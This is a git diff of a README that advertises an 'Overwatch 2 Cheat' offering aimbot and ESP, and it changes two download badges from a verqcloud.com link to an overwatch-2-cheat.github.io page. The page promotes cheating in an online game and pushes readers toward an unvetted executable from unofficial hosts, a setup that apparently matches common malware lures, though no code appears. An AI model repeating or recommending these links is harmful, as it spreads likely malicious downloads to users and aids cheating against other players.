@@ -2,7 +2,7 @@
 
 The **Overwatch 2 Cheat** is a powerful tool designed to enhance your gameplay by providing various modifications and features like **aimbot**, **ESP (Extra Sensory Perception)**, and more. This cheat tool gives you an edge in matches by automating actions, revealing hidden information, and improving overall performance. Whether you're looking for more precise targeting, better visibility, or gameplay tweaks, this cheat tool offers the customization you need.
 
-[![Download Overwatch2 Cheat](https://img.shields.io/badge/Download-Overwatch2%20Cheat-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Overwatch2 Cheat](https://img.shields.io/badge/Download-Overwatch2%20Cheat-blueviolet)](https://overwatch-2-cheat.github.io/.github/)
 
 ## Features
 
@@ -23,4 +23,4 @@ The **Overwatch 2 Cheat** is a powerful tool designed to enhance your gameplay b
 4. Launch **Overwatch 2** and activate the cheat using the hotkey assigned in the settings.
 5. Customize the cheat features and settings to your preference for a personalized experience.
 
-[![Download Overwatch2 Cheat](https://img.shields.io/badge/Download-Overwatch2%20Cheat-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Overwatch2 Cheat](https://img.shields.io/badge/Download-Overwatch2%20Cheat-blueviolet)](https://overwatch-2-cheat.github.io/.github/)
